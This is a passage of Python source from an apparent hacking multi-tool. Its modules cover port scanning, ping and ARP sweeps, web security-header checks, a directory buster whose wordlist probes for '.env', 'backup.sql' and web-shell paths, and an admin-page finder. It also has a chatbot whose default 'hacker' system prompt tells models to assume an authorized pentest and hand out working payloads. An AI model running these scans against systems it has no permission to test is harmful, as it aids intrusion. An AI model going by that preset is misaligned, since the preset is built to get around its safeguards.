        dangerous = ["PUT", "DELETE", "TRACE", "OPTIONS", "CONNECT", "PATCH"]
        try:
            r = requests.options(url, timeout=5, verify=False)
            allow = r.headers.get("Allow", "") + r.headers.get("Access-Control-Allow-Methods", "")
            for method in dangerous:
                if method in allow.upper():
                    kind = "hit" if method in ("PUT", "DELETE", "TRACE") else "warn"
                    status(f"{method} method allowed", kind)
        except Exception as e:
            status(f"Error: {e}", "err")

    def check_clickjacking(self, url):
        print(f"\n{SC}[*] Checking clickjacking protection{SR}")
        try:
            r = requests.get(url, timeout=5, verify=False)
            xfo = r.headers.get("X-Frame-Options", "").upper()
            csp = r.headers.get("Content-Security-Policy", "")
            if xfo in ("DENY", "SAMEORIGIN"):
                status(f"X-Frame-Options: {xfo}", "ok")
            elif "frame-ancestors" in csp:
                status(f"CSP frame-ancestors set", "ok")
            else:
                status("No clickjacking protection - can be iframed", "hit")
        except Exception as e:
            status(f"Error: {e}", "err")

    def run(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        boxed("VULNERABILITY SCANNER", color=SY)
        print(f"\n{SY}[!] Scan Modules:{SR}")
        print(f"  {SC}[1]{SR} Full scan (all checks)")
        print(f"  {SC}[2]{SR} Security headers only")
        print(f"  {SC}[3]{SR} SSL/TLS inspection")
        print(f"  {SC}[4]{SR} Exposed paths")
        print(f"  {SC}[5]{SR} CORS misconfig")
        print(f"  {SC}[6]{SR} Cookie security flags")
        print(f"  {SC}[7]{SR} .git/.svn exposure")
        print(f"  {SC}[8]{SR} Dangerous HTTP methods")
        print(f"  {SC}[9]{SR} Clickjacking test")
        choice = input(f"\n{SG}[+] Choice: {SR}")
        url = input(f"{SG}[+] Target URL: {SR}")

        actions = {
            "1": lambda: [self.check_headers(url), self.check_ssl(url), self.check_vulnerabilities(url),
                          self.check_cors(url), self.check_cookies(url), self.check_git_exposure(url),
                          self.check_methods(url), self.check_clickjacking(url)],
            "2": lambda: self.check_headers(url),
            "3": lambda: self.check_ssl(url),
            "4": lambda: self.check_vulnerabilities(url),
            "5": lambda: self.check_cors(url),
            "6": lambda: self.check_cookies(url),
            "7": lambda: self.check_git_exposure(url),
            "8": lambda: self.check_methods(url),
            "9": lambda: self.check_clickjacking(url),
        }
        action = actions.get(choice, actions["1"])
        action()
        pause()

class NetworkScanner:
    def __init__(self):
        self.name = "NETWORK SCANNER"

    def ping_sweep(self, subnet):
        print(f"\n{SC}[*] Ping Sweep on {subnet}.0/24{SR}")
        hosts = []
        base = ".".join(subnet.split(".")[:3])
        total = 254
        for i in range(1, 255):
            ip = f"{base}.{i}"
            try:
                result = subprocess.run(["ping", "-c", "1", "-W", "1", ip], capture_output=True, timeout=2)
                if result.returncode == 0:
                    print(f"    {SG}[+] {ip} - ACTIVE{SR}")
                    hosts.append(ip)
            except:
                pass
            progress_bar(i, total, prefix=f"{SC}Scanning IPs{SR}")
        print()
        return hosts

    def port_scanner(self, target, ports=None):
        if ports is None:
            ports = [21, 22, 23, 25, 53, 80, 110, 139, 143, 443, 445, 993, 995, 1433, 1521, 2049, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 9000, 27017]
        print(f"\n{SC}[*] Port Scan on {target}{SR}")
        open_ports = []
        total = len(ports)
        for i, port in enumerate(ports):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1.5)
                result = sock.connect_ex((target, port))
                if result == 0:
                    try:
                        sock.send(b"HELP\r\n" if port in [21, 23] else b"\r\n")
                        banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
                    except:
                        banner = "No banner"
                    print(f"    {SG}[+] Port {port} OPEN - {self.guess_service(port)} - {banner[:50]}{SR}")
                    open_ports.append({"port": port, "service": self.guess_service(port), "banner": banner[:100]})
                sock.close()
            except:
                pass
            progress_bar(i+1, total, prefix=f"{SC}Scanning Ports{SR}")
        print()
        return open_ports

    def guess_service(self, port):
        services = {21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS", 80: "HTTP", 110: "POP3", 139: "NetBIOS", 143: "IMAP", 443: "HTTPS", 445: "SMB", 993: "IMAPS", 995: "POP3S", 1433: "MSSQL", 1521: "Oracle", 2049: "NFS", 3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL", 5900: "VNC", 6379: "Redis", 8080: "HTTP-Proxy", 8443: "HTTPS-Alt", 9000: "Custom", 27017: "MongoDB"}
        return services.get(port, "Unknown")

    def os_fingerprint(self, target):
        print(f"\n{SC}[*] OS Fingerprinting on {target}{SR}")
        try:
            result = subprocess.run(["ping", "-c", "1", "-W", "2", target], capture_output=True, text=True)
            output = result.stdout + result.stderr
            ttl_match = re.search(r'[Tt][Tt][Ll]=(\d+)', output)
            if ttl_match:
                ttl = int(ttl_match.group(1))
                if ttl <= 64:
                    os_guess = "Linux/Unix/MacOS"
                elif ttl <= 128:
                    os_guess = "Windows"
                else:
                    os_guess = "Android/Cisco/BSD"
                print(f"    {SG}[+] TTL: {ttl} - Likely OS: {os_guess}{SR}")
                return os_guess
        except:
            print(f"    {R}[-] Unable to determine OS{SR}")
        return "Unknown"

    def dns_enum(self, domain):
        print(f"\n{SC}[*] DNS Enumeration for {domain}{SR}")
        records = {}
        try:
            ip = socket.gethostbyname(domain)
            records["A"] = ip
            print(f"    {SG}[+] A record: {domain} -> {ip}{SR}")
        except:
            print(f"    {SY}[-] No A record{SR}")
        for record_type in ['MX', 'NS', 'TXT']:
            try:
                answers = dns.resolver.resolve(domain, record_type)
                records[record_type] = [str(rdata) for rdata in answers]
                for rdata in records[record_type]:
                    print(f"    {SG}[+] {record_type}: {rdata[:80]}{SR}")
            except:
                print(f"    {SY}[-] No {record_type} records{SR}")
        if input(f"    {SG}[+] Scan subdomains? (y/N): {SR}").lower() == 'y':
            subdomains = ["www", "mail", "ftp", "admin", "blog", "shop", "api", "dev", "test", "webmail", "cpanel", "ns1", "ns2", "mx", "smtp", "pop", "imap", "vpn", "remote", "gitlab", "jenkins", "jira"]
            print(f"    {SC}[*] Searching subdomains...{SR}")
            for sub in subdomains:
                subdomain = f"{sub}.{domain}"
                try:
                    ip = socket.gethostbyname(subdomain)
                    print(f"    {SG}[+] {subdomain} -> {ip}{SR}")
                    records[subdomain] = ip
                except:
                    pass
        return records

    def traceroute(self, target):
        print(f"\n{SC}[*] Traceroute to {target}{SR}")
        cmd = ["tracert", "-h", "20", target] if os.name == "nt" else ["traceroute", "-m", "20", target]
        try:
            subprocess.run(cmd)
        except FileNotFoundError:
            status("traceroute/tracert not installed", "err")

    def whois_lookup(self, target):
        print(f"\n{SC}[*] WHOIS {target}{SR}")
        if shutil.which("whois"):
            subprocess.run(["whois", target])
            return
        try:
            tld = target.rsplit(".", 1)[-1]
            servers = {"com": "whois.verisign-grs.com", "net": "whois.verisign-grs.com",
                       "org": "whois.pir.org", "io": "whois.nic.io", "fr": "whois.nic.fr"}
            server = servers.get(tld, "whois.iana.org")
            sock = socket.socket()
            sock.settimeout(10)
            sock.connect((server, 43))
            sock.sendall(f"{target}\r\n".encode())
            data = b""
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                data += chunk
            sock.close()
            print(data.decode(errors='ignore'))
        except Exception as e:
            status(f"WHOIS error: {e}", "err")

    def banner_grab(self, target, port):
        print(f"\n{SC}[*] Banner grab {target}:{port}{SR}")
        probes = {
            21: b"",
            22: b"",
            25: b"EHLO test\r\n",
            80: b"HEAD / HTTP/1.0\r\n\r\n",
            110: b"",
            143: b"",
            443: b"",
            3306: b"",
        }
        try:
            sock = socket.socket()
            sock.settimeout(5)
            sock.connect((target, int(port)))
            probe = probes.get(int(port), b"\r\n")
            if probe:
                sock.send(probe)
            banner = sock.recv(2048).decode(errors='ignore')
            sock.close()
            print(f"{W}{banner}{SR}")
        except Exception as e:
            status(f"Error: {e}", "err")

    def arp_scan(self, iface=None):
        print(f"\n{SC}[*] ARP scan on local network{SR}")
        try:
            from scapy.all import ARP, Ether, srp
        except ImportError:
            status("Installing scapy...", "warn")
            _pip_install("scapy")
            from scapy.all import ARP, Ether, srp
        try:
            subnet = input(f"{SG}[+] Subnet CIDR (e.g., 192.168.1.0/24): {SR}")
            pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=subnet)
            ans, _ = srp(pkt, timeout=3, verbose=0, iface=iface)
            for _, rcv in ans:
                status(f"{rcv.psrc}  <-  {rcv.hwsrc}", "ok")
        except PermissionError:
            status("Root required for ARP scan", "err")
        except Exception as e:
            status(f"Error: {e}", "err")

    def geoip_lookup(self, target):
        print(f"\n{SC}[*] GeoIP lookup {target}{SR}")
        try:
            ip = socket.gethostbyname(target)
            r = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
            data = r.json()
            if data.get("status") == "success":
                for key in ("country", "regionName", "city", "zip", "lat", "lon", "isp", "org", "as"):
                    if data.get(key):
                        status(f"{key}: {data[key]}", "ok")
            else:
                status(data.get("message", "Lookup failed"), "err")
        except Exception as e:
            status(f"Error: {e}", "err")

    def run(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        boxed("NETWORK SCANNER TOOL", color=SB)
        print(f"\n{SY}[!] Network Scanner Modules:{SR}")
        print(f"  {SC}[1]{SR} Ping Sweep            {SC}[6]{SR} Traceroute")
        print(f"  {SC}[2]{SR} Port Scan             {SC}[7]{SR} WHOIS lookup")
        print(f"  {SC}[3]{SR} OS Fingerprint        {SC}[8]{SR} Banner grabbing")
        print(f"  {SC}[4]{SR} DNS Enumeration       {SC}[9]{SR} ARP scan (LAN)")
        print(f"  {SC}[5]{SR} GeoIP lookup")
        choice = input(f"\n{SG}[+] Choice: {SR}")
        if choice == "1":
            subnet = input(f"{SG}[+] Subnet (e.g., 192.168.1): {SR}")
            self.ping_sweep(subnet)
        elif choice == "2":
            target = input(f"{SG}[+] Target IP or Domain: {SR}")
            ports_input = input(f"{SG}[+] Ports (comma-separated, or 'default'): {SR}")
            if ports_input.lower() == 'default' or not ports_input:
                self.port_scanner(target)
            else:
                ports = [int(p.strip()) for p in ports_input.split(",")]
                self.port_scanner(target, ports)
        elif choice == "3":
            target = input(f"{SG}[+] Target IP or Domain: {SR}")
            self.os_fingerprint(target)
        elif choice == "4":
            domain = input(f"{SG}[+] Domain: {SR}")
            self.dns_enum(domain)
        elif choice == "5":
            self.geoip_lookup(input(f"{SG}[+] IP or Domain: {SR}"))
        elif choice == "6":
            self.traceroute(input(f"{SG}[+] Target: {SR}"))
        elif choice == "7":
            self.whois_lookup(input(f"{SG}[+] Domain: {SR}"))
        elif choice == "8":
            target = input(f"{SG}[+] Target: {SR}")
            port = input(f"{SG}[+] Port: {SR}")
            self.banner_grab(target, port)
        elif choice == "9":
            self.arp_scan()
        pause()

class CryptoModule:
    def __init__(self):
        self.name = "CRYPTO & ENCODING"

    def encode(self, text):
        print(f"\n{SC}[*] Encoding: {text}{SR}")
        print(f"  {SG}Base64: {base64.b64encode(text.encode()).decode()}{SR}")
        print(f"  {SG}Base32: {base64.b32encode(text.encode()).decode()}{SR}")
        print(f"  {SG}Base16 (Hex): {text.encode().hex()}{SR}")
        print(f"  {SG}Hex Reversed: {text[::-1].encode().hex()}{SR}")
        print(f"  {SG}URL Encoded: {quote(text)}{SR}")
        print(f"  {SG}Binary: {' '.join(format(ord(c), '08b') for c in text)}{SR}")
        def rot13(s):
            result = []
            for c in s:
                if 'a' <= c <= 'z':
                    result.append(chr((ord(c) - ord('a') + 13) % 26 + ord('a')))
                elif 'A' <= c <= 'Z':
                    result.append(chr((ord(c) - ord('A') + 13) % 26 + ord('A')))
                else:
                    result.append(c)
            return ''.join(result)
        print(f"  {SG}ROT13: {rot13(text)}{SR}")

    def hash_string(self, text):
        print(f"\n{SC}[*] Hashing: {text}{SR}")
        print(f"  {SG}MD5: {hashlib.md5(text.encode()).hexdigest()}{SR}")
        print(f"  {SG}SHA1: {hashlib.sha1(text.encode()).hexdigest()}{SR}")
        print(f"  {SG}SHA256: {hashlib.sha256(text.encode()).hexdigest()}{SR}")
        print(f"  {SG}SHA512: {hashlib.sha512(text.encode()).hexdigest()}{SR}")
        print(f"  {SG}SHA3-256: {hashlib.sha3_256(text.encode()).hexdigest()}{SR}")
        print(f"  {SG}BLAKE2b: {hashlib.blake2b(text.encode()).hexdigest()}{SR}")
        try:
            ntlm = hashlib.new('md4', text.encode('utf-16le')).hexdigest()
            print(f"  {SG}NTLM: {ntlm}{SR}")
        except:
            print(f"  {SY}NTLM: not available (md4 disabled){SR}")

    def hash_identifier(self, hash_value):
        print(f"\n{SC}[*] Analyzing Hash: {hash_value}{SR}")
        length = len(hash_value)
        print(f"    {SY}Length: {length} characters{SR}")
        hash_types = []
        is_hex = all(c in '0123456789abcdef' for c in hash_value.lower())
        if length == 32 and is_hex:
            hash_types.append("MD5, MD4, MD2, LM, NTLM")
        if length == 40 and is_hex:
            hash_types.append("SHA1, SHA1(MySQL), MySQL5")
        if length == 56 and is_hex:
            hash_types.append("SHA224, SHA3-224")
        if length == 64 and is_hex:
            hash_types.append("SHA256, SHA3-256")
        if length == 96 and is_hex:
            hash_types.append("SHA384, SHA3-384")
        if length == 128 and is_hex:
            hash_types.append("SHA512, SHA3-512")
        if hash_value.startswith(("$2b$", "$2a$", "$2y$")):
            hash_types.append("Bcrypt")
        if hash_value.startswith("$6$"):
            hash_types.append("SHA-512 (Unix)")
        if hash_value.startswith("$5$"):
            hash_types.append("SHA-256 (Unix)")
        if hash_value.startswith("$1$"):
            hash_types.append("MD5 (Unix)")
        if hash_types:
            for h in hash_types:
                print(f"    {SG}[+] Possible: {h}{SR}")
        else:
            print(f"    {SY}[-] Hash type not recognized{SR}")

    def caesar_brute(self, text):
        print(f"\n{SC}[*] Caesar brute-force (all 25 shifts){SR}")
        for shift in range(1, 26):
            out = ""
            for c in text:
                if 'a' <= c <= 'z':
                    out += chr((ord(c) - ord('a') + shift) % 26 + ord('a'))
                elif 'A' <= c <= 'Z':
                    out += chr((ord(c) - ord('A') + shift) % 26 + ord('A'))
                else:
                    out += c
            print(f"  {SY}ROT{shift:2}:{SR} {W}{out}{SR}")

    def atbash(self, text):
        out = ""
        for c in text:
            if 'a' <= c <= 'z':
                out += chr(ord('z') - (ord(c) - ord('a')))
            elif 'A' <= c <= 'Z':
                out += chr(ord('Z') - (ord(c) - ord('A')))
            else:
                out += c
        print(f"  {SG}Atbash: {out}{SR}")

    def rot47(self, text):
        out = ""
        for c in text:
            if 33 <= ord(c) <= 126:
                out += chr(33 + ((ord(c) + 14) % 94))
            else:
                out += c
        print(f"  {SG}ROT47: {out}{SR}")

    def xor_cipher(self, text, key):
        out = bytes([b ^ key for b in text.encode()])
        print(f"  {SG}XOR (key 0x{key:02x}) hex: {out.hex()}{SR}")
        print(f"  {SG}XOR base64: {base64.b64encode(out).decode()}{SR}")

    def aes_encrypt(self, text, password):
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
            from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
            from cryptography.hazmat.primitives import hashes as cr_hashes
        except ImportError:
            status("Installing cryptography...", "warn")
            _pip_install("cryptography")
            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
            from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
            from cryptography.hazmat.primitives import hashes as cr_hashes

        salt = os.urandom(16)
        iv = os.urandom(16)
        kdf = PBKDF2HMAC(algorithm=cr_hashes.SHA256(), length=32, salt=salt, iterations=100000)
        key = kdf.derive(password.encode())

        padded = text.encode()
        pad_len = 16 - (len(padded) % 16)
        padded += bytes([pad_len]) * pad_len

        cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
        ct = cipher.encryptor().update(padded)
        blob = base64.b64encode(salt + iv + ct).decode()
        print(f"  {SG}AES-256-CBC (PBKDF2, 100k iter):{SR}")
        print(f"  {W}{blob}{SR}")

    def rsa_keygen(self, bits=2048):
        try:
            from cryptography.hazmat.primitives.asymmetric import rsa
            from cryptography.hazmat.primitives import serialization
        except ImportError:
            status("Installing cryptography...", "warn")
            _pip_install("cryptography")
            from cryptography.hazmat.primitives.asymmetric import rsa
            from cryptography.hazmat.primitives import serialization

        key = rsa.generate_private_key(public_exponent=65537, key_size=bits)
        priv_pem = key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        ).decode()
        pub_pem = key.public_key().public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        ).decode()
        print(f"\n{SG}[+] Private key:{SR}\n{W}{priv_pem}{SR}")
        print(f"\n{SG}[+] Public key:{SR}\n{W}{pub_pem}{SR}")

    def decode_all(self, text):
        print(f"\n{SC}[*] Attempting all decodings on: {text}{SR}")
        attempts = [
            ("Base64", lambda: base64.b64decode(text).decode('utf-8', errors='replace')),
            ("Base32", lambda: base64.b32decode(text).decode('utf-8', errors='replace')),
            ("Hex",    lambda: bytes.fromhex(text).decode('utf-8', errors='replace')),
            ("URL",    lambda: unquote(text)),
            ("Binary", lambda: ''.join(chr(int(b, 2)) for b in text.split())),
        ]
        for name, fn in attempts:
            try:
                result = fn()
                if result and any(c.isprintable() for c in result):
                    print(f"  {SG}{name}:{SR} {W}{result[:200]}{SR}")
            except Exception:
                pass

    def run(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        boxed("CRYPTO & ENCODING TOOL", color=SY)
        print(f"\n{SY}[!] Crypto Modules:{SR}")
        print(f"  {SC}[1]{SR} Encode text (all formats)    {SC}[ 7]{SR} AES-256 encrypt")
        print(f"  {SC}[2]{SR} Hash text (MD5/SHA/NTLM)     {SC}[ 8]{SR} RSA keygen")
        print(f"  {SC}[3]{SR} Identify hash type           {SC}[ 9]{SR} Auto-decode unknown")
        print(f"  {SC}[4]{SR} Caesar brute-force ROT1-25   {SC}[10]{SR} XOR cipher")
        print(f"  {SC}[5]{SR} Atbash cipher                {SC}[11]{SR} ROT47")
        print(f"  {SC}[6]{SR} File hash                    {SC}[12]{SR} HMAC-SHA256")
        choice = input(f"\n{SG}[+] Choice: {SR}")

        if choice == "1":
            self.encode(input(f"{SG}[+] Text: {SR}"))
        elif choice == "2":
            self.hash_string(input(f"{SG}[+] Text: {SR}"))
        elif choice == "3":
            self.hash_identifier(input(f"{SG}[+] Hash: {SR}"))
        elif choice == "4":
            self.caesar_brute(input(f"{SG}[+] Ciphertext: {SR}"))
        elif choice == "5":
            self.atbash(input(f"{SG}[+] Text: {SR}"))
        elif choice == "6":
            path = input(f"{SG}[+] File path: {SR}")
            with open(path, "rb") as f:
                data = f.read()
            print(f"  {SG}MD5:    {hashlib.md5(data).hexdigest()}{SR}")
            print(f"  {SG}SHA256: {hashlib.sha256(data).hexdigest()}{SR}")
        elif choice == "7":
            self.aes_encrypt(input(f"{SG}[+] Plaintext: {SR}"), input(f"{SG}[+] Password: {SR}"))
        elif choice == "8":
            bits = int(input(f"{SG}[+] Key size (2048/4096): {SR}") or "2048")
            self.rsa_keygen(bits)
        elif choice == "9":
            self.decode_all(input(f"{SG}[+] Unknown encoded string: {SR}"))
        elif choice == "10":
            key = int(input(f"{SG}[+] XOR key (0-255): {SR}") or "42")
            self.xor_cipher(input(f"{SG}[+] Text: {SR}"), key)
        elif choice == "11":
            self.rot47(input(f"{SG}[+] Text: {SR}"))
        elif choice == "12":
            import hmac
            msg = input(f"{SG}[+] Message: {SR}")
            key = input(f"{SG}[+] Secret key: {SR}")
            sig = hmac.new(key.encode(), msg.encode(), hashlib.sha256).hexdigest()
            print(f"  {SG}HMAC-SHA256: {sig}{SR}")
        pause()

class AIChatbot:
    MODELS = [
        ("DeepSeek Chat", "deepseek/deepseek-chat", "Fast, free, great for code"),
        ("DeepSeek R1 (reasoning)", "deepseek/deepseek-r1", "Reasoning model, step-by-step"),
        ("Claude Sonnet 4.5", "anthropic/claude-sonnet-4.5", "Best balance, strong at security"),
        ("Claude Opus 4.1", "anthropic/claude-opus-4.1", "Most capable Claude"),
        ("GPT-4o", "openai/gpt-4o", "OpenAI flagship"),
        ("GPT-4o Mini", "openai/gpt-4o-mini", "Cheap and fast"),
        ("Gemini 2.0 Flash", "google/gemini-2.0-flash-exp:free", "Free tier"),
        ("Llama 3.3 70B", "meta-llama/llama-3.3-70b-instruct", "Open weights"),
        ("Qwen 2.5 Coder 32B", "qwen/qwen-2.5-coder-32b-instruct", "Code specialist"),
        ("Mistral Large", "mistralai/mistral-large", "European alternative"),
    ]
    DEFAULT_MODEL = "deepseek/deepseek-chat"
    API_URL = "https://openrouter.ai/api/v1/chat/completions"
    PRESETS = {
        "hacker": "You are an elite cybersecurity expert and offensive security researcher. Give concise, technical answers with working code, payloads, and commands. Assume authorized pentesting context.",
        "explain": "You are a patient cybersecurity teacher. Explain concepts clearly with examples. Break down complex topics into simple steps.",
        "coder":   "You are a senior Python developer focused on security tooling. Write clean, working code with brief explanations.",
        "ctf":     "You are a CTF champion. Help solve challenges quickly: identify the category, suggest tools, provide exploit steps or payloads.",
    }

    def __init__(self):
        self.name = "AI CHATBOT"
        self.key_file = os.path.join(TOOLS_DIR, ".openrouter_key")
        self.api_key = self.load_key()
        self.history = []
        self.current_model = self.DEFAULT_MODEL
        self.current_preset = "hacker"

    def show_models(self):
        print(f"\n{SC}┌─ Available Models ─────────────────────────────────{SR}")
        for i, (name, model_id, desc) in enumerate(self.MODELS, 1):
            mark = f"{SG}●{SR}" if model_id == self.current_model else f"{SY}○{SR}"
            print(f"{SC}│{SR} {mark} {SC}[{i:2}]{SR} {W}{name:<26}{SR} {SY}{desc}{SR}")
        print(f"{SC}└────────────────────────────────────────────────────{SR}")

    def show_presets(self):
        print(f"\n{SC}┌─ Response Style Presets ──────────────────────────{SR}")
        styles = {
            "hacker":  "Offensive security, concise, payload-heavy",
            "explain": "Teacher mode, clear explanations",
            "coder":   "Python code focus, clean snippets",
            "ctf":     "CTF problem solver, fast hints",
        }
        for key, desc in styles.items():
            mark = f"{SG}●{SR}" if key == self.current_preset else f"{SY}○{SR}"
            print(f"{SC}│{SR} {mark} {W}{key:<10}{SR} {SY}{desc}{SR}")
        print(f"{SC}└───────────────────────────────────────────────────{SR}")

    def select_model(self):
        self.show_models()
        choice = input(f"\n{SG}[+] Model number (Enter to keep current): {SR}").strip()
        if not choice:
            return
        try:
            idx = int(choice) - 1
            if 0 <= idx < len(self.MODELS):
                name, model_id, _ = self.MODELS[idx]
                self.current_model = model_id
                print(f"{SG}[+] Switched to: {name}{SR}")
            else:
                print(f"{R}[-] Invalid number{SR}")
        except ValueError:
            print(f"{R}[-] Not a number{SR}")

    def select_preset(self):
        self.show_presets()
        choice = input(f"\n{SG}[+] Preset name (Enter to keep current): {SR}").strip().lower()
        if choice and choice in self.PRESETS:
            self.current_preset = choice
            self.history = []
            print(f"{SG}[+] Style set to '{choice}'. History cleared.{SR}")

    def load_key(self):
        if os.path.exists(self.key_file):
            try:
                with open(self.key_file, "r") as f:
                    return f.read().strip()
            except:
                return None
        return None

    def save_key(self, key):
        try:
            with open(self.key_file, "w") as f:
                f.write(key)
            os.chmod(self.key_file, 0o600)
            return True
        except Exception as e:
            print(f"{R}[!] Could not save key: {e}{SR}")
            return False

    def ask(self, query, model=None):
        model = model or self.current_model
        system_prompt = self.PRESETS.get(self.current_preset, self.PRESETS["hacker"])

        messages = [
            {"role": "system", "content": system_prompt}
        ]
        messages.extend(self.history)
        messages.append({"role": "user", "content": query})

        spinner = Spinner(f"Thinking with {model.split('/')[-1]}", color=SM).start()

        try:
            r = requests.post(
                self.API_URL,
                headers={
                    "Authorization": f"Bearer {self.api_key}",
                    "Content-Type": "application/json",
                    "HTTP-Referer": "https://github.com/cameleonnbss",
                    "X-Title": "Multi-Tool v5",
                },
                json={
                    "model": model,
                    "messages": messages,
                    "temperature": 0.7,
                    "stream": True,
                },
                timeout=60,
                stream=True,
            )

            if r.status_code != 200:
                spinner.stop()
                print(f"{R}[!] API Error {r.status_code}: {r.text[:200]}{SR}")
                return None

            spinner.stop()
            print(f"\n{SM}╭─ {SC}AI Response {SM}─────────────────────────────────────────{SR}")
            print(f"{SM}│{SR}")

            full_response = ""
            first_chunk = True

            for line in r.iter_lines(decode_unicode=True):
                if not line or not line.startswith("data: "):
                    continue
                payload = line[6:].strip()
                if payload == "[DONE]":
                    break
                try:
                    chunk = json.loads(payload)
                    delta = chunk.get("choices", [{}])[0].get("delta", {}).get("content", "")
                    if delta:
                        if first_chunk:
                            sys.stdout.write(f"{SM}│ {W}")
                            first_chunk = False
                        formatted = delta.replace("\n", f"\n{SM}│ {W}")
                        sys.stdout.write(formatted)
                        sys.stdout.flush()
                        full_response += delta
                except json.JSONDecodeError:
                    continue

            print(f"{SR}")
            print(f"{SM}│{SR}")
            print(f"{SM}╰─────────────────────────────────────────────────────{SR}")

            self.history.append({"role": "user", "content": query})
            self.history.append({"role": "assistant", "content": full_response})
            if len(self.history) > 20:
                self.history = self.history[-20:]

            return full_response

        except requests.exceptions.Timeout:
            spinner.stop()
            print(f"{R}[!] Request timed out{SR}")
            return None
        except Exception as e:
            spinner.stop()
            print(f"{R}[!] Error: {e}{SR}")
            return None

    def run(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        boxed("AI CHATBOT  -  Powered by OpenRouter", color=SC, padding=3)

        if not self.api_key:
            print(f"\n{SY}[!] No OpenRouter API key found.{SR}")
            print(f"{SC}[i] Get a free key at: https://openrouter.ai/keys{SR}")
            key = input(f"{SG}[+] Enter your OpenRouter API key: {SR}").strip()
            if not key:
                print(f"{R}[-] No key provided, aborting.{SR}")
                pause()
                return
            if self.save_key(key):
                self.api_key = key
                print(f"{SG}[+] Key saved to {self.key_file}{SR}")

        current_name = next((n for n, m, _ in self.MODELS if m == self.current_model), self.current_model)
        print(f"\n{SG}  Current model: {SC}{current_name}{SR}")
        print(f"{SG}  Current style: {SC}{self.current_preset}{SR}")

        print(f"\n{SY}  Commands in chat:{SR}")
        print(f"    {SC}/model{SR}   - switch AI model (numbered list)")
        print(f"    {SC}/style{SR}   - switch response style preset")
        print(f"    {SC}/clear{SR}   - reset conversation history")
        print(f"    {SC}/history{SR} - show conversation so far")
        print(f"    {SC}/save{SR}    - save chat to file")
        print(f"    {SC}/exit{SR}    - back to main menu\n")
        divider(color=SC)

        while True:
            try:
                query = input(f"\n{SG}[you] > {SR}").strip()
                if not query:
                    continue

                cmd = query.lower()
                if cmd in ("/exit", "/quit", "exit", "quit", "q"):
                    break
                if cmd in ("/clear", "clear"):
                    self.history = []
                    status("History cleared.", "ok")
                    continue
                if cmd in ("/model", "model"):
                    self.select_model()
                    continue
                if cmd in ("/style", "style", "/preset"):
                    self.select_preset()
                    continue
                if cmd in ("/history", "history"):
                    if not self.history:
                        status("Empty history.", "warn")
                    for msg in self.history:
                        role = SG if msg["role"] == "user" else SC
                        print(f"{role}[{msg['role']}]{SR} {msg['content'][:200]}")
                    continue
                if cmd in ("/save", "save"):
                    fn = f"chat_{int(time.time())}.md"
                    with open(os.path.join(TOOLS_DIR, fn), "w") as f:
                        for msg in self.history:
                            f.write(f"## {msg['role']}\n\n{msg['content']}\n\n")
                    status(f"Saved to {os.path.join(TOOLS_DIR, fn)}", "ok")
                    continue

                self.ask(query)
            except KeyboardInterrupt:
                print(f"\n{SY}[!] Exiting chat...{SR}")
                break
        pause()

class WebHackingSuite:
    def __init__(self):
        self.name = "WEB HACKING SUITE"

    def directory_buster(self, url, wordlist=None):
        if wordlist is None:
            wordlist = ["admin", "login", "wp-admin", "administrator", "backup", "config", "db", "phpmyadmin", "panel", "cpanel", "uploads", "files", "images", "css", "js", "api", "v1", "test", "dev", "secret", "robots.txt", ".env", "sitemap.xml", "index.php", "index.html", "config.php", "config.json", "database.yml", "settings", "wp-content", "wp-includes", "vendor", "node_modules", ".git", ".svn", ".htaccess", "server-status", "info.php", "shell.php", "cmd.php", "upload.php", "download.php", "backup.zip", "backup.sql", "dump.sql", "admin.php"]
        print(f"\n{SC}[*] Directory Busting on {url}{SR}")
        found = []
        total = len(wordlist)
        for i, path in enumerate(wordlist):
            test_url = url.rstrip("/") + "/" + path.lstrip("/")
            try:
                r = requests.get(test_url, timeout=3, verify=False, allow_redirects=False)
                if r.status_code == 200:
                    print(f"    {SG}[+] {test_url} -> {r.status_code} ({len(r.content)} bytes){SR}")
                    found.append({"url": test_url, "status": r.status_code, "size": len(r.content)})
                elif r.status_code in [301, 302, 307, 308]:
                    print(f"    {SY}[→] {test_url} -> {r.status_code} -> {r.headers.get('Location', 'N/A')}{SR}")
                    found.append({"url": test_url, "status": r.status_code, "redirect": r.headers.get('Location', '')})
                elif r.status_code == 403:
                    print(f"    {R}[!] {test_url} -> {r.status_code} (Forbidden){SR}")
                elif r.status_code == 401:
                    print(f"    {SG}[+] {test_url} -> {r.status_code} (Authentication required){SR}")
            except:
                pass
            progress_bar(i+1, total, prefix=f"{SC}Testing Paths{SR}")
        print()
        return found

    def admin_finder(self, url):
        print(f"\n{SC}[*] Admin Page Finder on {url}{SR}")
        admin_paths = ["admin", "administrator", "login", "wp-admin", "panel", "cpanel", "admin/login", "admin/index", "admin/panel", "adminarea", "adminpanel", "dashboard", "moderator", "backend", "adm", "siteadmin", "admin/login.php", "admin/index.php", "gestion", "administration", "login.php", "user/login", "auth/login", "signin", "connexion", "member/login", "members", "account/login", "secure"]
        found = []
        total = len(admin_paths)
        for i, path in enumerate(admin_paths):
            test_url = url.rstrip("/") + "/" + path
            try:
                r = requests.get(test_url, timeout=5, verify=False, allow_redirects=False)
                if r.status_code in [200, 301, 302, 401, 403]:
                    print(f"    {SG}[+] {test_url} -> {r.status_code}{SR}")
                    found.append({"url": test_url, "status": r.status_code})
            except:
                pass
